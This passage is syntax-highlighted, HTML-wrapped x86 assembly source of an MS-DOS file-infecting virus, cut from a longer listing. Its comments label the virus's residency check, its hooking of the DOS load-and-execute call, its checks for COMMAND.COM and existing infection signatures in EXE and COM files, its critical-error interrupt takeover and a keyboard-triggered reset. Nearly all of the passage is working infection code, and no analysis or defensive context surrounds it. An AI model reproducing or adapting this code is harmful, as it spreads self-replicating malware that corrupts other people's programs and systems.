    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">BP0160</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">53H</span><span class="sc0">          </span><span class="sc1">; Del character token?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0160</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc2">0F3H</span><span class="sc0">         </span><span class="sc1">; Set off Alt &amp; Ctrl states</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BB0417</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">       </span><span class="sc1">; Replace key states</span><span class="sc0">
    </span><span class="sc6">IN</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">61H</span><span class="sc0">          </span><span class="sc1">; Get Port B</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">           </span><span class="sc1">; Save value</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">          </span><span class="sc1">; Set on keyboard reset bit</span><span class="sc0">
    </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc2">61H</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">          </span><span class="sc1">; Output port B</span><span class="sc0">
    </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">           </span><span class="sc1">; Recover original Port B value</span><span class="sc0">
    </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc2">61H</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">          </span><span class="sc1">; Output port B</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0110</span><span class="sc0">          </span><span class="sc1">; Message and reboot</span><span class="sc0">

</span><span class="sc5">BP0160</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">INT_09</span><span class="sc0">          </span><span class="sc1">; Interrupt 9</span><span class="sc0">

    </span><span class="sc1">; Interrupt 21H</span><span class="sc0">

</span><span class="sc5">BP0170</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSHF</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0E1H</span><span class="sc0">         </span><span class="sc1">; Virus "are you there" call</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0180</span><span class="sc0">          </span><span class="sc1">; Branch if other call</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0400H</span><span class="sc0">        </span><span class="sc1">; Standard "yes"</span><span class="sc0">
    </span><span class="sc6">POPF</span><span class="sc0">
    </span><span class="sc6">IRET</span><span class="sc0">

</span><span class="sc5">BP0180</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0DDH</span><span class="sc0">         </span><span class="sc1">; Virus move and execute COM call</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0200</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4B00H</span><span class="sc0">        </span><span class="sc1">; Is it load and execute</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0190</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0210</span><span class="sc0">          </span><span class="sc1">; Process load and execute</span><span class="sc0">

</span><span class="sc5">BP0190</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POPF</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0">          </span><span class="sc1">; Interrupt 21H</span><span class="sc0">

    </span><span class="sc1">; Move program down and execute (COM only) call</span><span class="sc0">

    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
</span><span class="sc5">BP0200</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; Retrieve return offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">100H</span><span class="sc0">         </span><span class="sc1">; Replace with start address</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">V_RTOF</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Store in return jump</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; Retrieve return segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">V_RTSG</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Store in return jump</span><span class="sc0">
    </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">MOVSB</span><span class="sc0">           </span><span class="sc1">; Restore program to beginning</span><span class="sc0">
    </span><span class="sc6">POPF</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BEGIN</span><span class="sc0">        </span><span class="sc1">; Start with zero register</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">VIR_RT</span><span class="sc0">          </span><span class="sc1">; Start actual program</span><span class="sc0">

    </span><span class="sc1">; Process load and execute program</span><span class="sc0">

</span><span class="sc5">BP0210</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">F_HAND</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; No file handle</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">MEM_SW</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Set off memory allocated switch</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">FPTHOF</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">       </span><span class="sc1">; Save pathname offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">FPTHSG</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc0">       </span><span class="sc1">; Save pathname segment</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">CLD</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Point to file pathname</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc8">DL</span><span class="sc0">           </span><span class="sc1">; Default drive</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">3AH</span><span class="sc0"> </span><span class="sc1">; Test second character for ':'</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0220</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Get drive letter</span><span class="sc0">
    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">1FH</span><span class="sc0">          </span><span class="sc1">; Convert to number</span><span class="sc0">
</span><span class="sc5">BP0220</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">36H</span><span class="sc0">          </span><span class="sc1">; Get disk free space</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Get disk free)</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; Test for invalid drive</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0240</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
</span><span class="sc5">BP0230</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0530</span><span class="sc0">          </span><span class="sc1">; Terminate</span><span class="sc0">

</span><span class="sc5">BP0240</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MUL</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">          </span><span class="sc1">; Calc number of free sectors</span><span class="sc0">
    </span><span class="sc6">MUL</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">          </span><span class="sc1">; Calc number of free bytes</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Test high word of result</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">BP0250</span><span class="sc0">          </span><span class="sc1">; Branch if not zero</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENDADR</span><span class="sc0">    </span><span class="sc1">; Length of virus</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0230</span><span class="sc0">          </span><span class="sc1">; Terminate if less</span><span class="sc0">
</span><span class="sc5">BP0250</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">FPTHOF</span><span class="sc0">       </span><span class="sc1">; Get pathname offset</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; \ Set ES to DS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">           </span><span class="sc1">; Test character - zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">41H</span><span class="sc0">          </span><span class="sc1">; Maximum pathname length</span><span class="sc0">
    </span><span class="sc6">REPNZ</span><span class="sc0">   </span><span class="sc6">SCASB</span><span class="sc0">           </span><span class="sc1">; Find end of pathname</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">FPTHOF</span><span class="sc0">       </span><span class="sc1">; Get pathname offset</span><span class="sc0">
</span><span class="sc5">BP0260</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Get pathname character</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">           </span><span class="sc1">; Test for a character</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">BP0280</span><span class="sc0">          </span><span class="sc1">; Finish if none</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">61H</span><span class="sc0">          </span><span class="sc1">; Test for 'a'</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0270</span><span class="sc0">          </span><span class="sc1">; Branch if less</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">7AH</span><span class="sc0">          </span><span class="sc1">; Test for 'z'</span><span class="sc0">
    </span><span class="sc6">JA</span><span class="sc0">  </span><span class="sc5">BP0270</span><span class="sc0">          </span><span class="sc1">; Branch if above</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">20H</span><span class="sc0">   </span><span class="sc1">; Convert to uppercase</span><span class="sc0">
</span><span class="sc5">BP0270</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">          </span><span class="sc1">; Address next character</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0260</span><span class="sc0">          </span><span class="sc1">; Process next character</span><span class="sc0">

</span><span class="sc5">BP0280</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0BH</span><span class="sc0">          </span><span class="sc1">; Load length 11</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; Address back by length</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">COM_CM</span><span class="sc0">    </span><span class="sc1">; 'COMMAND.COM'</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set ES to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0BH</span><span class="sc0">          </span><span class="sc1">; Load length again</span><span class="sc0">
    </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">CMPSB</span><span class="sc0">           </span><span class="sc1">; Compare</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0290</span><span class="sc0">          </span><span class="sc1">; Continue if not command.com</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0530</span><span class="sc0">          </span><span class="sc1">; Terminate</span><span class="sc0">

</span><span class="sc5">BP0290</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4300H</span><span class="sc0">        </span><span class="sc1">; Get file attributes</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Get attributes)</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0300</span><span class="sc0">          </span><span class="sc1">; Follow chain of error branches</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">F_ATTS</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; Save file attributes</span><span class="sc0">
</span><span class="sc5">BP0300</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0320</span><span class="sc0">          </span><span class="sc1">; Follow chain of error branches</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">           </span><span class="sc1">; Scan character - zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">EXE_SW</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">       </span><span class="sc1">; Set EXE switch off</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; \ Set ES to DS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Pointer to pathname</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">41H</span><span class="sc0">          </span><span class="sc1">; Maximum pathname length</span><span class="sc0">
    </span><span class="sc6">REPNZ</span><span class="sc0">   </span><span class="sc6">SCASB</span><span class="sc0">           </span><span class="sc1">; Find end of pathname</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">4DH</span><span class="sc0"> </span><span class="sc1">; Is last letter 'M'</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0310</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">6DH</span><span class="sc0"> </span><span class="sc1">; Is last letter 'm'</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0310</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc5">EXE_SW</span><span class="sc0">          </span><span class="sc1">; Set EXE switch on</span><span class="sc0">
</span><span class="sc5">BP0310</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3D00H</span><span class="sc0">        </span><span class="sc1">; Open handle, read only</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Open handle)</span><span class="sc0">
</span><span class="sc5">BP0320</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0330</span><span class="sc0">          </span><span class="sc1">; Follow chain of error branches</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">F_HAND</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Save file handle</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; File handle</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">EXE_SW</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Test EXE switch</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0340</span><span class="sc0">          </span><span class="sc1">; Branch if off</span><span class="sc0">

    </span><span class="sc1">; Test EXE file for infection</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1CH</span><span class="sc0">          </span><span class="sc1">; Length of EXE header</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">EXEHED</span><span class="sc0">    </span><span class="sc1">; .EXE header store</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">           </span><span class="sc1">; \
    MOV DS,AX           ;  ) Make DS &amp; ES same as CS</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc0">          </span><span class="sc1">; Read handle</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Read handle)</span><span class="sc0">
</span><span class="sc5">BP0330</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0370</span><span class="sc0">          </span><span class="sc1">; Follow chain of error branches</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">EXHD09</span><span class="sc4">,</span><span class="sc2">1988H</span><span class="sc0">        </span><span class="sc1">; Negative checksum</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0360</span><span class="sc0">          </span><span class="sc1">; Branch if not infected</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0350</span><span class="sc0">          </span><span class="sc1">; Dont infect</span><span class="sc0">

    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
</span><span class="sc5">BP0340</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4202H</span><span class="sc0">        </span><span class="sc1">; Move file pointer</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; \ End of file minus 6</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,-</span><span class="sc2">6</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Move pointer)</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0320</span><span class="sc0">          </span><span class="sc1">; Follow chain of error branches</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">            </span><span class="sc1">; Total file size</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">F_SIZE</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Save total file size</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">            </span><span class="sc1">; Length to read</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SIGBUF</span><span class="sc0">    </span><span class="sc1">; Infection test buffer</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">           </span><span class="sc1">; \
    MOV DS,AX           ;  ) Make DS &amp; ES same as CS</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc0">          </span><span class="sc1">; Read handle</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Read handle)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Address test buffer</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VR_SIG</span><span class="sc0">    </span><span class="sc1">; Signature</span><span class="sc0">
    </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">CMPSB</span><span class="sc0">           </span><span class="sc1">; Compare signatures</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0360</span><span class="sc0">          </span><span class="sc1">; Branch if not infected</span><span class="sc0">
</span><span class="sc5">BP0350</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3EH</span><span class="sc0">          </span><span class="sc1">; Close handle</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Close handle)</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0530</span><span class="sc0">          </span><span class="sc1">; Terminate</span><span class="sc0">

</span><span class="sc5">BP0360</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3524H</span><span class="sc0">        </span><span class="sc1">; Get interrupt 24H</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Get int)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">I24OFF</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">       </span><span class="sc1">; Save interrupt 24H offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">I24SEG</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">       </span><span class="sc1">; Save interrupt 24H segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0090</span><span class="sc0">    </span><span class="sc1">; Interrupt 24H routine</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">2524H</span><span class="sc0">        </span><span class="sc1">; Set interrupt 24H</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Set int)</span><span class="sc0">
